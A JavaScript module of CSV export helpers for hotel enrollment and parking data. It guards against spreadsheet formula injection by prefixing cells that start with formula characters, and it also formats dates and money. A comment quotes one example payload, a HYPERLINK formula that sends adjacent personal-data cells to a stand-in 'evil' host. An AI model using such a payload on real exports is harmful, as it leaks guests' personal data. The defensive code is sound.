// CSV cell formatting for the two exports (enrollments, parking).
//
// Quoting alone is not enough. Excel and Sheets treat a cell starting with
// =, +, - or @ as a formula, and every field these exports write — guest name,
// plate, vehicle description, notes — is typed by an unauthenticated member of
// the public. A guest called `=HYPERLINK("https://evil/?"&A1&A2,"Click")` gets
// that formula executed the moment the owner opens the file, with the adjacent
// PII columns as its arguments. Prefixing with an apostrophe makes the cell
// literal text; Excel does not display the apostrophe.
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * @param {*} v            the value to render
 * @param {string} [tz]    hotel timezone; when given, Dates render as local
 *                         calendar time rather than a UTC ISO string
 */
export function csvCell(v, tz) {
  if (v === null || v === undefined) return '';

  if (v instanceof Date) {
    if (!tz) return v.toISOString();
    const parts = new Intl.DateTimeFormat('en-CA', {
      timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit',
      hour: '2-digit', minute: '2-digit', hour12: false,
    }).formatToParts(v).reduce((a, p) => ((a[p.type] = p.value), a), {});
    return `${parts.year}-${parts.month}-${parts.day} ${parts.hour}:${parts.minute}`;
  }

  let s = String(v);
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Cents as plain dollars — the owner opens these in Excel. */
export function csvMoney(cents) {
  if (cents === null || cents === undefined) return '';
  return (Number(cents) / 100).toFixed(2);
}
